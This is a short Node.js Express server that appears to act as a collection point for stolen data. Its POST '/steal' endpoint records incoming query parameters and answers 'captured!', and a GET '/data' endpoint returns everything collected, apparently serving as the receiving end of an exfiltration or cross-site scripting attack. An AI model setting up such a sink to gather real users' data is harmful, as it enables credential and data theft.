var app = require('express')();
var http = require('http').Server(app);
app.use(require('body-parser')())

const port = process.env.PORT || 5000

var data = []

app.post('/steal', (req, res) => {
    data.push(req.query)
    res.send('captured!')
})

app.get('/data', (req, res) => {
    res.send(data)
})

http.listen(port, () => {
    console.log('server started at ' + port);
})